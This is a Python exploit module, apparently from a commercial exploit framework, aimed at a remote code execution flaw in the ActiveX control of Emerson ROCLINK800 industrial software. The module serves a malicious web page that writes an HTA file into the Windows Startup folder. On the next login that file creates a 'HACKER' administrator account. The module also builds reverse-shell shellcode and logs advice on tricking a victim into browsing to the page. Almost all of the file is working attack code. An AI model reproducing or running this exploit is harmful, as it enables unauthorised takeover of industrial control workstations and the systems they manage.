#! /usr/bin/env python
# -*- coding: utf_8 -*-
# The exploit is a part of EAST Framework - use only under the license agreement specified in LICENSE.txt in your EAST Framework distribution

import sys
import os
import socket

sys.path.append("./core")
sys.path.append("./shellcodes")
from Sploit import Sploit
import ShellUtils
import Shellcodes

INFO = {}
INFO['NAME'] = "efs_emerson_roclink800_activex_rce"
INFO['DESCRIPTION'] = "Emerson ROCLINK800 arpro2.dll ActiveX Control Remote Code Execution Vulnerability"
INFO['VENDOR'] = "http://www2.emersonprocess.com/en-us/brands/roc/software/roclink800/pages/roclink800.aspx"
INFO['DOWNLOAD_LINK'] = ''
INFO['LINKS'] = ''
INFO["CVE Name"] = "0-day"
INFO["NOTES"] = """
Loaded File: C:\Program Files\ROCLINK800\arpro2.dll
Name:        DDActiveReports2
Lib GUID:    {A7973091-BC64-4F16-84D4-A4BE059B4927}
Version:     2.0
Lib Classes: 44

Class ActiveReport
GUID: {9EB8768B-CDFA-44DF-8F3E-857A8405E1DB}
Number of Interfaces: 1
Default Interface: IActiveReport
RegKey Safe for Script: True
RegKey Safe for Init: True
KillBitSet: False

The resulting file will lauch operating system commands at the next startup.
"""

INFO['CHANGELOG'] = "28 Sep, 2014. Written by Gleg team."
INFO['PATH'] = 'Exploits/Client_side/'

# Must be in every module, to be set by framework
OPTIONS = {}
OPTIONS["PORT"] = 80

class exploit(Sploit):
    def __init__(self, host = "", port = 0, logger = None):
        Sploit.__init__(self, logger = logger)
        self.name = INFO['NAME']
        self.port = port
        self.host = host
        self.state = "running"
        return
        
    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.port = int(self.args.get('PORT', self.port))
        return
    
    def create_shellcode(self):
        self.log("[>] Generate shellcode started")

        os_target = ShellUtils.Constants.OS.WINDOWS
        os_target_arch = ShellUtils.Constants.OS_ARCH.X32
        if self.args['listener']:
            port = self.args['listener']['PORT']
        else:
            return None
        s = Shellcodes.OSShellcodes(os_target, os_target_arch, socket.gethostbyname(socket.gethostname()), port,)
        
        shellcode_type = "reverse"
        shellcode = s.create_shellcode(shellcode_type)
        
        self.log("Length of shellcode: %d" % len(shellcode))
        self.log("[+] Generate shellcode finished")
        
        return shellcode
    
    def makesploit(self):
        shell = self.create_shellcode()
        filedata = """
<html>
<object classid='clsid:9EB8768B-CDFA-44DF-8F3E-857A8405E1DB' id='obj' /></object>
<script language=vbscript>
Dim my
my =    "</Sc"
my=my & "RiPt><"
my=my & "SCRIpt> var x=new ActiveXObject('WScript.Shell'); x.Exec('net user HACKER 12345 /add /y');"
my=my & "x.Exec('net localgroup Administrators HACKER /add');<"
my=my & "/SCriPT><sCrIPt>"

obj.Script = my
obj.SaveLayout "C:\\\\Documents and Settings\\\\All Users\\\\Start Menu\\\\Programs\\\\Startup\\\\starthack.hta", 1
</script>
        """
        
        if len(shell) % 2:
            shell = "\x90" + shell

        shellcode = "unescape(\""
        i = 0
        while i < len(shell):
            shellcode += "%u" + "%02X%02X" %(ord(shell[i+1]),ord(shell[i]))     
            i += 2
        shellcode += "\")"
        filedata = filedata.replace("<SHELLCODE>", shellcode)
        return filedata
        
    def run(self):
        self.args()
        self.log("Attacking {}".format(self.host))
        
        self.log('Trick user to visit your ip via internet explorer to port ' + str(self.port))
        
        page = self.makesploit()
        answer = 'HTTP/1.1 200 OK\r\n'
        answer += 'Content-Length: ' + str(len(page)) + '\r\n'
        answer += 'Connection: close\r\n\r\n'
        answer += page
        answer += '\r\n'
        
        try:
            s = socket.socket()
            s.bind(('', self.port))
            s.listen(1)
            self.log('Waiting victim')
            conn, addr = s.accept()
            req = conn.recv(1024)
            self.log("Send evil page....")
            conn.send(answer)
            conn.close()
            self.log('Page uploaded')
            self.log()
            self.log('Now wait, until user reboot his system and use HACKER/12345 user/password to login')
            
            self.log("Finished this exploit")
            self.finish(True)
            return 1

        except:
            self.log("failed!")
            self.finish(False)
            return 0
        
if __name__ == '__main__':
    """
        By now we only have the tool mode for exploit..
        Later we would have standalone mode also.
    """

    print "Running exploit %s .. " % INFO['NAME']
    e = exploit('', 80)
    e.run()
